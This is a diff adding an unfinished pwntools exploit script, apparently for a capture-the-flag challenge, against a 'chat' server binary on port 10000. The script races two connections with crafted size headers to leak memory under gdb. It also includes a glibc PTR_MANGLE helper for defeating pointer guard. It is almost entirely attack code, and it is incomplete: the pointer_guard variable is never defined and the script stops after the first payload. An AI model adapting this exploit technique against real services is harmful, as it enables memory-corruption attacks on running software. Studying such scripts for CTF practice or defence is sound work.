@@ -1,0 +1,61 @@
+#!/usr/bin/python3
+
+from pwn import *
+import time
+
+IP = '0'
+PORT = 10000
+
+exe = ELF('chat', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+s = lambda proc, data: proc.send(data)
+
+def PTR_MANGLE(var):
+    var ^= pointer_guard
+    return ((var << 0x11) & 0xffffffffffffffff) | (var >> (64 - 0x11))
+
+def recv_msg(p):
+    # Receive name
+    name = b''
+    size = u32(p.recv(4),sign=True)
+    while True:
+        name += p.recv(size-len(name))
+        if len(name)==size:
+            break
+
+    # Receive message
+    msg = b''
+    size = u32(p.recv(4),sign=True)
+    while True:
+        msg += p.recv(size-len(msg))
+        if len(msg)==size:
+            break
+
+    return name, msg
+
+#############################
+### Phase 1: Race to leak ###
+#############################
+# Race condition
+p = process("./chat")
+p1 = remote(IP, PORT)
+p2 = remote(IP, PORT)
+context.terminal = ["foot"]
+# p1 = process("./chat")
+# p2 = process("./chat")
+gdb.attach(p,gdbscript="")
+input("first time send -> ")
+s(p1, p32(0)+p32(0x100)+p32(0x32))
+input("second time send -> ")
+s(p2,p32(0)+p32(0x1000)+p32(0x43))
+input("send data ->")
+s(p1,"a"*0x100)
+
+# # sleep(.25)
+# input("second time send -> ")
+p.interactive()
+#
+#
